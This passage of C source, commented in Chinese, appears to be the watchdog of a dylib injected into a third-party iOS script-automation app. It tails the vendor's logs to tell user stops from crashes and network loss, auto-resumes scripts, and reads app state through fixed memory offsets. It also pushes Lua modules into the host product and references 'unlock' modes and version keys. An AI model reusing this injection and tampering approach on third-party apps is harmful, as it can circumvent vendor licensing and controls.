        // ★ v6.33 精度：只认「本次运行周期内」的错误 —— 签名必须晚于最后一次 run 事件。
        //   否则窗口里上一轮遗留的 run script error 会把一次真·中控停止误判成厂商因错停，
        //   进而让 [ar] 把用户刚停掉的脚本又拉起来（正是 14:58 那类事故的另一种形态）。
        if (pse && lr && pse < lr) pse = NULL;
        if (paf && lr && paf < lr) paf = NULL;
        if (paf) {
            kind = 3;                          // 授权失败后被厂商杀
        } else if (pse) {
            kind = 4;                          // 厂商因脚本/模块报错自动停
        } else {
            // ★★★★ v6.40：兜底 kind=2 再拆一层（断网恢复不自启的真正元凶）。
            //   stop 前 4KB 里如果有**网络故障签名**，这次停极可能是「我们 killswitch 发
            //   OPER_STOP → 厂商 agent 执行时正好在重连授权服」留下的，绝不能判人停：
            //     [kill] TRIGGERED (heartbeat lost) -> OPER_STOP        ← 我们发的
            //     tcp connect server timeout!                            ← 断网症状
            //     connect remote server3 failed!                         ← 断网症状
            //     agent stop script                                      ← 厂商执行
            //   判成 2 → 5998 disarm 清 lst → 网络恢复后 armed=0 lst=0 永不接（216 实证）。
            //   拆出 kind=6 = 自停（归属不明但确定不是人点的），[ar] 按 self-stop 走。
            //   ★ 真·中控/人停不受影响：它带 `begin process operate script msg`，
            //     已在上面 :5408 提前 return 2。App 内手动停止也是同一条消息通道。
            int netfail = 0;
            p = w0;
            while (p < ls) {
                if (!strncmp(p, "tcp connect server timeout", 26) ||
                    !strncmp(p, "connect remote server", 21) ||
                    !strncmp(p, "connect server failed", 21) ||
                    !strncmp(p, "tcp connect failed", 18) ||
                    !strncmp(p, "no network", 10)) { netfail = 1; break; }
                ++p;
            }
            kind = netfail ? 6 : 2;
        }
    } else if (lr) {
        kind = 1;
    }
    free(buf);
    return kind;
}

// ★ v6.24i：判断「最后一条事件是中控显式停脚本」——用于避免空闲兜底与人工停脚本打架。
//   中控停脚本会在 agent.log 留 "begin process operate script msg!"（★ v6.24k：
//   原写 "begin process stop script msg" 是错的 —— 设备实查该串 0 次、
//   operate 串 4 次，导致本函数恒返回 0，空闲兜底因此把用户停掉的脚本又拉起来）。
//   若停止标志出现在最后一次 "begin run script" 之后，说明是人工停的，不许自动拉。
static int bs_last_stop_is_user(const char *path, long want) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    struct stat sb;
    if (fstat(fd, &sb) != 0 || sb.st_size <= 0) { close(fd); return 0; }
    long off = sb.st_size > want ? sb.st_size - want : 0;
    long add = sb.st_size - off;
    char *buf = (char *)malloc((size_t)add + 1);
    if (!buf) { close(fd); return 0; }
    lseek(fd, off, SEEK_SET);
    ssize_t gn = read(fd, buf, (size_t)add);
    close(fd);
    if (gn <= 0) { free(buf); return 0; }
    buf[gn] = 0;
    char *lr = NULL, *ls = NULL, *q = buf;
    while ((q = strstr(q, "begin run script")) != NULL) { lr = q; ++q; }
    // ★ v6.24l：只用**精确的停止痕迹**。`begin process operate script msg` 虽然实测
    //   4 次全是停止，但它是中控「操作消息」的统一入口（运行同样走它），语义不可靠，
    //   一旦厂商改用它下发运行就会把「刚点运行」误判成「刚点停止」→ 闸门反锁。
    //   `agent stop script` 是厂商真正执行停止时必打的一行，最精确。
    q = buf;
    while ((q = strstr(q, "agent stop script")) != NULL) { ls = q; ++q; }
    q = buf;
    while ((q = strstr(q, "begin process stop script msg")) != NULL) {
        if (!ls || q > ls) ls = q;
        ++q;
    }
    free(buf);
    return (ls && (!lr || ls > lr)) ? 1 : 0;
}

// ★ v6.24e：最近一次 run 尝试是否以 run script error 收场 —— 返回「距该次 run 的秒数」，
//   无此类失败返回 -1。
//   判据：tail 内最后一次 "begin run script" 之后出现过 "run script error"（= 真的跑过
//   又炸了，且其后没有新的 run）。窗口必须放大（agent.log 的 server2 重连循环每 20s
//   就写 3 行，4KB 窗口几分钟就被挤满 —— 10-19 08:03 .216 首版实测漏判）。
//   同时用行首 "[YYYY/MM/DD HH:MM:SS]" 解析时刻，供调用方做过期判断。
static long bs_last_run_failed_age(const char *path, long want) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    struct stat sb;
    if (fstat(fd, &sb) != 0 || sb.st_size <= 0) { close(fd); return -1; }
    long off = sb.st_size > want ? sb.st_size - want : 0;
    long add = sb.st_size - off;
    char *buf = (char *)malloc((size_t)add + 1);
    if (!buf) { close(fd); return -1; }
    lseek(fd, off, SEEK_SET);
    ssize_t gn = read(fd, buf, (size_t)add);
    close(fd);
    if (gn <= 0) { free(buf); return -1; }
    buf[gn] = 0;
    long age = -1;
    char *last = NULL, *q = buf;
    while ((q = strstr(q, "begin run script")) != NULL) { last = q; ++q; }
    if (last && strstr(last, "run script error")) {
        char *ls = last;
        while (ls > buf && ls[-1] != '\n') --ls;
        if (*ls == '[') {
            struct tm tmv;
            memset(&tmv, 0, sizeof(tmv));
            tmv.tm_isdst = -1;
            if (strptime(ls + 1, "%Y/%m/%d %H:%M:%S", &tmv) != NULL) {
                time_t tt = mktime(&tmv);
                time_t nw = time(NULL);
                if (tt > 0) { age = (long)(nw - tt); if (age < 0) age = -1; }
            }
        }
        if (age < 0) age = 0;   // 时间戳解析失败时按「刚刚」处理（宁可救不误弃）
    }
    free(buf);
    return age;
}

static int bs_tail_count(const char *path, long want, const char *needle) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    struct stat sb;
    if (fstat(fd, &sb) != 0 || sb.st_size <= 0) { close(fd); return 0; }
    long off = sb.st_size > want ? sb.st_size - want : 0;
    long add = sb.st_size - off;
    char *buf = (char *)malloc((size_t)add + 1);
    if (!buf) { close(fd); return 0; }
    lseek(fd, off, SEEK_SET);
    ssize_t gn = read(fd, buf, (size_t)add);
    close(fd);
    if (gn <= 0) { free(buf); return 0; }
    buf[gn] = 0;
    int cnt = 0;
    const char *p = buf;
    while ((p = strstr(p, needle)) != NULL) { cnt++; p++; }
    free(buf);
    return cnt;
}

// ★★★ v6.31：文件尺寸（-1 = 不存在）。resume 时记基线，失败分类只看之后的增量。
static long bs_file_size(const char *path) {
    struct stat sb;
    return (stat(path, &sb) == 0) ? (long)sb.st_size : -1;
}

// ★★★ v6.31：只统计 [from, EOF) 区间的命中数（from<0 → 退化成「尾部 4KB」）。
//   为什么必须带区间：sjz.log 里历史那条 `nil value` 会一直躺在文件里，
//   若按尾部固定窗口扫，每一次新失败都会被误判成「配置类」，进而错误硬失败。
static int bs_count_from(const char *path, long from, const char *needle) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    struct stat sb;
    if (fstat(fd, &sb) != 0 || sb.st_size <= 0) { close(fd); return 0; }
    long off = from >= 0 ? from : (sb.st_size > 4096 ? sb.st_size - 4096 : 0);
    if (off > sb.st_size) off = sb.st_size;
    if (sb.st_size - off > 256 * 1024) off = sb.st_size - 256 * 1024;   // 上限 256KB
    long add = sb.st_size - off;
    if (add <= 0) { close(fd); return 0; }
    char *buf = (char *)malloc((size_t)add + 1);
    if (!buf) { close(fd); return 0; }
    lseek(fd, off, SEEK_SET);
    ssize_t gn = read(fd, buf, (size_t)add);
    close(fd);
    if (gn <= 0) { free(buf); return 0; }
    buf[gn] = 0;
    int cnt = 0;
    const char *p = buf;
    while ((p = strstr(p, needle)) != NULL) { cnt++; p++; }
    free(buf);
    return cnt;
}

// ★★★ v6.31：给「点了没起来」定性。只看 resume 之后新增字节（sjz_from / ag_from 是基线）。
//   顺序即优先级：模块类先判 —— nil 算术常常是模块没灌进去导致的次生错误，不能反着来。
static int ar_fail_class(char *out, size_t on, long sjz_from, long ag_from) {
    static const struct { const char *k; int c; const char *n; } T[] = {
        { "bs_module_lost",                               AR_CLS_MODULE, "module-lost" },
        { "load snail module failed",                     AR_CLS_MODULE, "loadfail"    },
        { "can not find version key",                     AR_CLS_MODULE, "noverkey"    },
        { "recv auth failed",                             AR_CLS_AUTH,   "auth-fail"   },
        { "attempt to perform arithmetic on a nil value",  AR_CLS_CONFIG, "nil-arith"   },
        { "game is not front app",                        AR_CLS_FG,     "not-front"   },
    };
    int i;
    for (i = 0; i < (int)(sizeof(T) / sizeof(T[0])); i++) {
        if (bs_count_from(DATA_DIR "/log/sjz.log",   sjz_from, T[i].k) > 0 ||
            bs_count_from(DATA_DIR "/log/agent.log", ag_from,  T[i].k) > 0) {
            snprintf(out, on, "%s", T[i].n);
            return T[i].c;
        }
    }
    snprintf(out, on, "unknown");
    return AR_CLS_UNKNOWN;
}

// ★ v6.24d：posix_spawn 薄封装 —— rootless 设备没有 /bin/sh，system() 必挂，
//   必须 posix_spawn + 显式绝对路径；sigdefault 全置 + mask 清空（继承标准语义）。
static void bs_spawnv(const char *path, char *const argv[]) {
    pid_t pid = -1;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    sigset_t all, none;
    sigfillset(&all);
    sigemptyset(&none);
    posix_spawnattr_setsigdefault(&attr, &all);
    posix_spawnattr_setsigmask(&attr, &none);
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETSIGDEF | POSIX_SPAWN_SETSIGMASK);
    int rc = posix_spawn(&pid, path, NULL, &attr, argv, environ);
    posix_spawnattr_destroy(&attr);
    bs_log("[v624d] spawn %s rc=%d", path, rc);
}

// ★ v6.24d：冷启 App 重建「启动服务」会话 —— ★ v6.24p 已废弃（原为崩溃重试状态机
//   的升级动作，状态机已删）。函数体保留会导致 unused 警告，故整段移除。

static void *bs_watchdog(void *arg) {
    uintptr_t base = (uintptr_t)arg;
    volatile uint64_t *stp  = (volatile uint64_t *)(base + OFF_STATE);
    volatile uint8_t  *runp = (volatile uint8_t  *)(base + OFF_RUN);
    uint64_t last_state = (uint64_t)-1;
    int stale = 0;
    // ★ v4.1：不再用 bool 锁死「只灌一次」。产品会在 _bb_init_script_player 里
    //   把整个 onion 字典**换新对象**（实测 str x0,[x9] 整体替换），换掉后旧判断
    //   永远不会重灌 → 后加的模块进不去。改为按「字典对象指针」变化重灌。
    void *last_dict = NULL;
    // ★ v6：记录上一轮脚本运行态，用于「脚本一停 → 立刻抹模块」
    uint8_t last_run = 0;
    int     saw_run  = 0;

    // ★ v6.7：自动重启状态机（相位 + 超时计数）—— ★ v6.24q 已随 [rl] 整体移除

    // ★ v6.17：func-nil 崩溃自动恢复（agent.log 增量扫描）—— v6.24p 起仅做证据与日志
    long   cr_size[2] = {-1, -1}; // ★ v6.23u [0]=agent.log [1]=sjz.log 上次尺寸（-1=首轮只记基线）
    time_t fg_last     = 0; // ★ v6.24d：上次 [fg] uiopen 游戏时刻（限速）
    time_t cr_stall_last = 0; // ★ v6.24p：上次停摆诊断扫描时刻
    int    us_latched = 0;    // ★ v6.24k：用户停止闸门在本进程内的缓存（配合 .bs_userstop）

    // ★★★ v6.36：模块盘面同步 —— 解决「注入后盘上才补回模块，dict 永不刷新」
    //   mod_last_n = 上次 bs_inject_modules 真正灌进去的条数
    //   mod_try_n  = 上次「因盘面变化而重注入」时看到的盘上文件数（防同一盘面反复重试刷日志）
    int    mod_last_n  = -1;
    int    mod_try_n   = -1;
    time_t mod_sync_at = 0;

    // ★ v6.28：[ar] 自动恢复运行时状态
    bs_ar_t ar;                      // 授权态（落盘 .bs_ar，重启后仍有效）
    bs_ar_read(&ar);
    time_t ar_t0        = time(NULL);  // 进程启动时刻（AR_BOOT_GRACE 静默期基准）
    time_t ar_notrun    = 0;           // st==0 持续起点（只用于 run 标志残留 1 的兜底）
    time_t ar_ok        = 0;           // 跑稳起点（满 AR_OK_STABLE 才清失败计数）
    time_t ar_vendor_ts = 0;           // 厂商杀脚本时刻（冷却用）
    int    ar_stop_kind = 0;           // agent.log 尾部事件分类（0/1/2/3）
    int    ar_cr_hit    = 0;           // 本拍崩溃签名（由下面 cr 扫描块回填）
    long   ar_sjz_mark  = -1;          // ★ v6.31：resume 时刻 sjz.log 尺寸（分类只看之后的增量）
    long   ar_ag_mark   = -1;          // ★ v6.31：同上 agent.log
    // ★★★ v6.31：上个进程遗留的 resume 回执窗口一律作废。
    //   为什么必须作废：vfy 是落盘的，进程重启后第一拍 st 必然是 0（容器还没起来），
    //   若照判就会把「装包/冷启」记成「点了没起来」，白白攒 hard 计数甚至直接硬失败。
    //   同时 ar.up 是单进程内的观察量，跨进程无意义。hard/hv 保留（6h 静默要跨重启生效）。
    if (ar.vfy && ar.vfy <= ar_t0) {
        bs_evt("[ar] stale verify window from prev process dropped (vfy=%ld t0=%ld)",
               (long)ar.vfy, (long)ar_t0);
        ar.vfy = 0;
        ar.up  = 0;
    }
    if (ar.armed) {
        bs_evt("[ar] armed restored from disk (att=%d gu=%d hard=%d hv=%ld) -> auto-resume active",
               ar.att, ar.gu, ar.hard, ar.hv);
    }

    // ★ v6.24r：给运行库状态建基线（一次性，无状态文件时按盘上 beta.so 算 md5）
    bs_so_state_bootstrap();

    for (;;) {
        sleep(WD_TICK_SECS);

        uint64_t st  = *stp;
        uint8_t  run = *runp;

        // ★★★ v6.28 严格版：lst = 「上次观察到脚本确实在跑」的唯一凭据。
        //   触发自动恢复只认它 —— st!=0 是真在跑（容器有效），一旦置 1 就落盘，
        //   进程重启/装包后仍然记得「这台机器本来在跑」。中控点停止时会被清 0。
        //   只在翻转时写盘（每秒一次 tick 不能都落盘）。
        if (st != 0) {
            // ★ 中控/用户刚下发停止时，脚本并不会立刻消失（st 还会非 0 几秒）。
            //   这几秒里若被「看到运行」重新武装，停止就会被接上（.216 实测踩到）。
            //   双重闸门：① stop_kind==2 / hold 后 60s 内；② run 必须仍为 1。
            int hold_stop = (ar_stop_kind == 2)
                         || (ar.hold && time(NULL) - ar.hold <= 60);
            int can_arm   = (run != 0) && !hold_stop;
            if (!ar.lst || (!ar.armed && can_arm)) {
                int was_armed = ar.armed;
                ar.lst = 1;
                if (!ar.armed && can_arm) {
                    ar.armed = 1; ar.att = 0; ar.gu = 0; ar.next = 0;
                    ar.hard = 0; ar.hv = 0; ar.vfy = 0; ar.up = 0;   // v6.31：重新武装=解除硬失败
                }
                bs_ar_write(&ar, can_arm && !was_armed ? "running" : "running-lst");
                bs_evt("[ar] RUNNING observed (st=%p run=%u) -> armed=%d lst=1%s",
                       (void *)st, (unsigned)run, ar.armed,
                       (!can_arm && !was_armed) ? " (center-stop hold, lst only)" : "");
            }
        }

        // ★ v6.24k：用户停止闸门同步 —— run==1（中控下发「运行」）即解除。
        //   放在最前面：本拍后续所有自动拉起分支统一读 us_latched。
        if (run) {
            if (bs_us_mark_exists()) {
                bs_us_mark_clear();
                bs_evt("[us] run=1 -> user-stop gate cleared");
            }
            us_latched = 0;
        } else {
            us_latched = bs_us_mark_exists();
        }

        // ★ v6.28：授权态路径①——run 0->1 且「确实在跑」才算中控下发了运行。
        //   冷启时厂商 run 标志会残留为 1（10-19 08:07 .216 实锤），若不加 sjz 新鲜度
        //   校验，装完包/重启后会误把「残留」当成新授权，用户点过停止也照样被拉起。
        //   路径②（agent.log 尾部是 begin run script）在下面 60s 扫描块里补。
        if (run && !last_run && !ar.armed) {
            long a_sja = bs_file_age(DATA_DIR "/log/sjz.log");
            // ★★★ v6.32：补上「agent.log 说最后一条是 run」这条独立证据。
            //   旧判据只看 sjz.log 新鲜度，脚本挂机无输出时它可能几十分钟不写，
            //   中控刚点的运行就会被判成「冷启残留」而不武装 → 自动恢复整段失效。
            int rk = bs_ar_stop_kind(DATA_DIR "/log/agent.log", 262144);
            if (saw_run || rk == 1 || (a_sja >= 0 && a_sja <= US_STOP_FRESH)) {
                ar.armed = 1; ar.att = 0; ar.gu = 0; ar.next = 0;
                ar.hard = 0; ar.hv = 0; ar.vfy = 0; ar.up = 0;   // v6.31：中控点了运行=解除硬失败
                bs_ar_write(&ar, "run1");
                bs_evt("[ar] armed (run 0->1, sjz=%lds rk=%d) -> auto-resume active", a_sja, rk);
            } else {
                bs_evt("[ar] run 0->1 but sjz=%lds (>%ds) rk=%d -> stale flag, NOT armed",
                       a_sja, US_STOP_FRESH, rk);
            }
        }

        // ★ v6.24r：运行库生效确认 —— run=1 说明脚本真的起来了，此刻加载的
        //   就是盘上的 beta.so，pend 可以清 0。这是「落盘 ≠ 生效」唯一的收敛点：
        //   pend=1 期间远程就知道「还得再点一次运行」，不用靠猜。
        if (run && saw_run) {
            // 用 sjz.log 新鲜度排除「App 冷启后 run 标志残留为 1」的假运行（10-19 08:07 实锤）
            long sja = bs_file_age(DATA_DIR "/log/sjz.log");
            int pend = -1;
            char smd5[40] = {0};
            long ssz = 0;
            if (sja >= 0 && sja <= US_STOP_FRESH
                && bs_so_state_read(smd5, sizeof(smd5), &ssz, &pend, NULL, NULL) && pend == 1) {
                bs_so_state_write(0, smd5, ssz);          // 保留 size，别写成 0
                bs_evt("[so] new so applied (script started, md5=%.8s) -> pend=0", smd5);
            }
        }

        // ---- ★ v6.24q：落盘后自动重启状态机已整体移除（用户指令：新 so 只落盘，
        //   脚本下次手动运行时自然加载；verwatch 按盘上版本预铺密钥，手动运行即可解）。

        // --- ★ v6：脚本 运行→停止 的那一刻，立刻抹掉本地模块 ---
        //     用户需求 #2：「脚本停止后，顺手把 bs_modules/*.lua 删除」。
        //     放在 watchdog 做（不是 puller），因为只有这里才能保证
        //     「不管脚本是被谁停的（中控点停 / 崩了 / 心跳杀的），都会清」。
        //     run 从 1 掉到 0 才触发；从未跑过（saw_run=0）不触发，避免启动即清空。
        if (run) { saw_run = 1; }
        // ★ v6.24k：run 1->0 = 脚本被停。默认按「用户主动停」处理，落盘闸门（.bs_userstop），
        //   禁止后续一切自动 OPER_START。若扫到崩溃签名，下面会撤销该闸门（崩溃优先）。
        //   排除：卡封禁下发的 STOP。（★ v6.24q：原 reload 自停排除条件随 [rl] 移除）
        if (!g_card_blocked && last_run == 1 && run == 0 && !us_latched) {
            // ★ v6.24l：必须确认「刚才真的在跑」才认定是用户停止。
            //   App 冷启时厂商 run 标志会残留为 1、初始化后掉 0（10-19 08:07 .216 实锤），
            //   那一下也构成 1->0，但 sjz.log 早已停摆 → 不是用户停止，不许落闸门（否则
            //   装完包/重启 App 后兜底永远不拉起，设备静默躺平）。
            long sa = bs_file_age(DATA_DIR "/log/sjz.log");
            time_t nwk = time(NULL);
            // ★★★ v6.32：stop 来源的**第一证据必须是 agent.log**，不许只靠 sjz.log 的 mtime。
            //   216 实证（2026-10-22 14:58）：脚本 12:13 起跑、14:07:51 后挂机无输出
            //   （sjz.log 连续 51 分钟零写入、stall scan 一路 run=1 st!=0 证明真在跑），
            //   中控 14:58:06 点停止 → 旧判据 sa=3017s > US_STOP_FRESH(300) → 误判成
            //   self-stop（"不是人停的"）→ [ar] 2 秒内 OPER_START 把脚本又拉回来。
            //   真正的中控证据（agent.log 里的 `agent stop script`）就在手边，先读它。
            int sk = bs_ar_stop_kind(DATA_DIR "/log/agent.log", 262144);
            if (sk == 2) {
                bs_evt("[us] stop evidence: agent.log = center/user stop -> gate NOW "
                       "(sjz=%lds, age ignored)", sa);
            }
            if (g_kill_sent && nwk - g_kill_ts <= 180) {
                // ★ v6.28：这次 1->0 是**我们自己** killswitch 发的 OPER_STOP，不是用户停。
                //   旧版会照旧落 .bs_userstop → 心跳恢复后设备永久躺平（7 天 TTL 才解），
                //   这是历史上「停了就再也不动」的一条隐蔽成因，必须排除。
                //   ★ 严格版：killswitch 的停也不许被 [ar] 接上（卡封禁期间拉起就是白拉）。
                //   ★★★ v6.39 拆分（断网事故根因）：
                //     · 授权拒绝/封禁（g_kill_resumable==0）→ 照旧清 lst，只留 AR_KILL_COOL。
                //     · 网络类失联（g_kill_resumable==1）→ **保留 lst**，只记 hold 时刻挡住
                //       st 滞后带来的重武装；等心跳恢复后由 [ar] 正常接上。
                //       旧版一律清 lst → 网络一恢复 [ar] 入口条件 `ar.armed && ar.lst`
                //       直接不成立，脚本永远停着等人点运行（断网设备的典型症状）。
                if (ar.lst && !g_kill_resumable) {
                    ar.lst = 0; ar.hold = nwk;
                    bs_ar_write(&ar, "killswitch-stop");
                } else if (ar.lst) {
                    ar.hold = nwk;      // 只挡 3 分钟，不动 lst → 允许自动接上
                    bs_ar_write(&ar, "killswitch-stop-resumable");
                }
                bs_evt("[us] run 1->0 from our killswitch (%lds ago) -> NOT a user stop, "
                       "no gate (resumable=%d, lst=%d)",
                       (long)(nwk - g_kill_ts), g_kill_resumable, ar.lst);
            } else if (sk == 2 || (sk == 0 && sa >= 0 && sa <= US_STOP_FRESH)) {
                // ★★★ v6.32：停止归属改成「日志证据优先」，不再用 sjz 年龄当第一判据。
                //   sk==2（agent.log 最后一条是 stop，且 stop 前 4KB 无错误/授权失败签名）
                //   → 无条件认「人停的」，这是 216 14:58 的正解；
                //   sk==0（尾部 256KB 里既无 run 也无 stop，只可能日志刚被轮转/清空）
                //   → 退回 v6.24l 的 sjz 新鲜度判据兜底。
                //   ★ v6.33：sk==4（厂商因 run script error / bs_module_lost 自动停）不再进这里，
                //     已归入下面的 else = 自停；否则「报错停住要自动拉起」会被本分支吃掉。
                //   sk==1（最后一条是 run）同样落 else = 自停：脚本刚崩时 sjz 也新鲜，
                //   旧逻辑会把它当人停，导致「报错停住不自动拉起」—— 用户明确要求要拉起。
                bs_us_mark_write("run 1->0");
                us_latched = 1;
                bs_cr_mark_clear();          // 用户停了，旧的崩溃证据一并作废
                // ★ v6.28：用户/中控明确停止 → 撤销授权态 + 清运行凭据，自动恢复不再介入。
                if (ar.armed || ar.lst) {
                    ar.armed = 0; ar.lst = 0; ar.att = 0; ar.gu = 0; ar.next = 0;
                    ar.hold = time(NULL);   // 记录停止时刻，挡住 st 滞后带来的重武装
                    bs_ar_write(&ar, "user-stop");
                    bs_evt("[ar] disarmed (explicit stop, run 1->0 sjz=%lds) -> no auto-resume",
                           sa);
                }
                bs_evt("[us] script stop observed (run 1->0, sjz=%lds sk=%d st=%p) -> auto-start gated until run=1",
                       sa, sk, (void *)st);
            } else {
                // ★★★ v6.28 严格版：这不是人停的（自己崩了 / 厂商杀的）。
                //   lst 保持 1，交给下面的 [ar] 块决定是否接上。
                //   ★ v6.32：进来有两条路 —— ① sk==1（agent.log 最后一条是 run，没人点过停止）；
                //   ② sk==0 且 sjz 早已停摆（无日志证据 + 日志文件也停摆）。两条都算自停，
                //   包括「刚崩、sjz 还很新鲜」这种旧版杀不掉的场景。
                //   ★ v6.33：第三条 —— sk==4（stop 前 4KB 有 run script error / bs_module_lost
                //   / 加载期失败串）= 厂商因脚本报错自己停的，用户要的正是这一条自动拉起。
                //   sk==3（recv auth failed）也落这里，随后由 ar_fail_class 判 auth → 硬失败窗口。
                bs_evt("[us] run 1->0 sk=%d(%s) sjz=%lds -> self-stop, ar will decide",
                       sk,
                       sk == 4 ? "vendor-error-stop" :
                       sk == 3 ? "auth-fail" :
                       sk == 1 ? "log-says-run" : "stale-sjz",
                       sa);
            }
        }
        // ★ v6.7：脚本停了就抹模块。（★ v6.24q：原 g_reload_busy 排除随 [rl] 移除）
        // ★★★ v6.34：**只有「用户/中控真点了停止」才抹模块**。
        //   为什么必须加这道门：模块一被抹，下一次运行必然 `bs_module_lost`（脚本 require 不到），
        //   而自停（厂商因报错停 / 我们准备 resume）本来就是要去重新拉起 —— 抹掉模块等于
        //   让 resume 起来的第一件事就是再炸一次 module-lost，厂商又停 → 60s 退避的报错循环。
        //   8167（57bebc06）2026-10-22 16:45 那次 `bs_module_lost:task_lhdb_into` 就是这个形态。
        //   killswitch（心跳失联）在 bs_killswitch 内部自己抹、卡封禁分支每拍也抹，均不受影响。
        if (saw_run && last_run == 1 && run == 0 && st != 0 && !us_latched) {
            bs_evt("[wd] self-stop -> KEEP %d local module(s) for auto-resume",
                   bs_count_local_modules());
        }
        if (saw_run && last_run == 1 && run == 0 && st != 0 && us_latched) {
            bs_evt("[wd] script stopped (run 1->0) -> wipe modules");
            char dpath[288];
            snprintf(dpath, sizeof(dpath), "%s", g_mod_dir);
            int wiped = 0;
            DIR *d = opendir(dpath);
            if (d) {
                struct dirent *de;
                while ((de = readdir(d)) != NULL) {
                    size_t ln = strlen(de->d_name);
                    if (ln < 5) continue;
                    if (strcmp(de->d_name + ln - 4, ".lua") != 0) continue;
                    char fp[320];
                    snprintf(fp, sizeof(fp), "%s/%s", dpath, de->d_name);
                    if (unlink(fp) == 0) wiped++;
                }
                closedir(d);
            }
            bs_evt("[wd] wiped %d module file(s) after stop", wiped);
        }
        last_run = run;

        // --- ★ v6.17：func-nil 崩溃自动恢复（★ v6.23u 签名放宽 + 扩扫 sjz.log）---
        // 厂商胶水 wait_call_func 的 4~5h 模块自刷新有缺陷：重载拿回 nil 函数 →
        // `run script error: attempt to call local 'func' (a nil value)` → 自动停脚本。
        // 每轮对 agent.log / sjz.log 各做增量扫描：新增字节命中签名（带/不带引号两种
        // 格式都收）、脚本已停稳、心跳授权中、不在 reload 状态机里、过了冷却 →
        // 发 OPER_START 拉起（等价中控再点一次运行）。
        // 中控点停 / killswitch / 心跳失联等路径不含该签名，自然不会误拉。
        {
            const char *cr_paths[2] = { DATA_DIR "/log/agent.log",
                                        DATA_DIR "/log/sjz.log" };
            int cr_hit = 0, cr_src = -1;
            int cr_loadfail = 0;   // ★ v6.24c：本次命中是否属「加载期失败」类
            int cri;
            for (cri = 0; cri < 2; cri++) {
                struct stat ags;
                if (stat(cr_paths[cri], &ags) == 0) {
                    long sz = (long)ags.st_size;
                    if (cr_size[cri] < 0 || sz < cr_size[cri]) {
                        // 首轮只记基线；日志被截断/轮转时重置基线且本轮不扫描（防旧签名误触发）
                        cr_size[cri] = sz;
                    } else if (sz > cr_size[cri]) {
                        long add = sz - cr_size[cri];
                        if (add > 262144) add = 262144;   // 异常暴增只看尾部 256K
                        long off = sz - add;
                        char *buf = (char *)malloc((size_t)add + 1);
                        if (buf) {
                            int fd = open(cr_paths[cri], O_RDONLY);
                            if (fd >= 0) {
                                lseek(fd, off, SEEK_SET);
                                ssize_t gn = read(fd, buf, (size_t)add);
                                close(fd);
                                if (gn > 0) {
                                    buf[gn] = 0;
                                    // ★ v6.23z：签名放宽 —— func-nil 两种格式之外，
                                    //   任意 "run script error:"（Agent 对脚本层错误的
                                    //   统一报错行）都视为脚本停摆信号。厂商行为是
                                    //   报错即自动停脚本，故命中即具备重拉前提；
                                    //   非致命误报由 CR_COOLDOWN + run/st 条件兜住。
                                    if (strstr(buf, "attempt to call local 'func' (a nil value)") ||
                                        strstr(buf, "attempt to call local func (a nil value)") ||
                                        strstr(buf, "run script error:")) {
                                        cr_hit = 1;
                                        cr_src = cri;
                                    }
                                    // ★ v6.24c：加载期失败 —— 缺版本密钥 / snail 模块加载失败。
                                    //   实测（10-17 .115）：beta.so 有 9 个段版本，dylib 启动
                                    //   先只铺到 2 把，中控 4s 后下发 run → 18s 加载失败；
                                    //   其余 7 把 19.7s 才补齐。这类失败**键补齐后重试必成**，
                                    //   因此同样视为停摆信号并交给重试状态机（不再干等人点）。
                                    if (strstr(buf, "can not find version key") ||
                                        strstr(buf, "load snail module failed")) {
                                        cr_hit = 1;
                                        cr_src = cri;
                                        cr_loadfail = 1;
                                    }
                                }
                            }
                            free(buf);
                        }
                    }
                    cr_size[cri] = sz;
                } else {
                    cr_size[cri] = -1;   // 文件暂时读不到（轮转瞬间），下轮重置基线
                }
                if (cr_hit) break;
            }
            if (cr_hit) {
                time_t nowt = time(NULL);
                // ★ v6.24h：先把证据落盘（App 重启会清空 agent.log，marker 不会）
                if (run == 0) bs_cr_mark_write(cr_src == 0 ? "agent" : "sjz");
                // ★ v6.28：崩溃不再「原地等人点运行」——交给下面 [ar] 判定，
                //   由 armed + 抑制矩阵决定要不要拉起。这里只回填标记 + 节流日志。
                ar_cr_hit = 1;
                static time_t cr_log = 0;
                if (nowt - cr_log >= 60) {
                    cr_log = nowt;
                    bs_evt("[cr] crash detected (%s%s) -> hand to [ar] (armed=%d)",
                           cr_src == 0 ? "agent.log" : "sjz.log",
                           cr_loadfail ? " loadfail" : "", ar.armed);
                }
            }
        }

        // --- ★ v6.24e：停摆兜底扫描（不依赖日志增量）---
        //   cr_pending 只在「本轮扫到新签名行」时置位；而 dylib 进程一旦重启，
        //   cr_size 基线重置 → 崩溃签名永远扫不到 → 静默停摆（10-19 07:57 .216：
        //   冷启 App 后 dylib 换了新进程，07:55 的 run-error 行再也没被读到时即如此）。
        //   这里每 CR_STALL_SCAN 秒复核 agent.log 尾部：最近一次 begin run script
        //   之后是 run script error（= run 真跑过又炸了，且其后没有成功的 run），
        //   判据用 **st==0**（脚本容器不存在）而不是 run==0 —— 10-19 08:07 .216 实测：
        //   App 冷启后厂商 run 标志仍滞留为 1（日志里 run=1 但 agent 早已 stop script、
        //   sjz 停摆 12 分钟），拿 run==0 当闸门会把这种情况永久挡住。st!=0 时脚本容器
        //   确实活着，绝不搅局；用户主动停脚本又不会留下 run-error 行，故不会误拉。
        if (g_mode == MODE_UNLOCK && !g_card_blocked) {
            time_t nowt4 = time(NULL);
            if (run) bs_cr_mark_clear();      // 跑起来了 = 已恢复，顺手清证据
            if (nowt4 - cr_stall_last >= CR_STALL_SCAN) {
                cr_stall_last = nowt4;
                char ap[300];
                snprintf(ap, sizeof(ap), "%s/log/agent.log", DATA_DIR);
                long rage = bs_last_run_failed_age(ap, 65536);
                long mage = bs_cr_mark_age();
                if (mage > 86400) { bs_cr_mark_clear(); mage = -1; }   // 过期证据不作数
                // ★ v6.24p：停摆/空闲兜底的自动 OPER_START 已删除（用户指令：脚本停了
                //   就是停了，只等人点「运行」）。本扫描仅保留两件事：
                //   ① 用户停止证据清理；② 5 分钟一条诊断快照（纯观察，远程定位卡点用）。
                long sjz_age = -1;
                char sp[300];
                snprintf(sp, sizeof(sp), "%s/log/sjz.log", DATA_DIR);
                struct stat ssb;
                if (stat(sp, &ssb) == 0) sjz_age = (long)(nowt4 - (time_t)ssb.st_mtime);
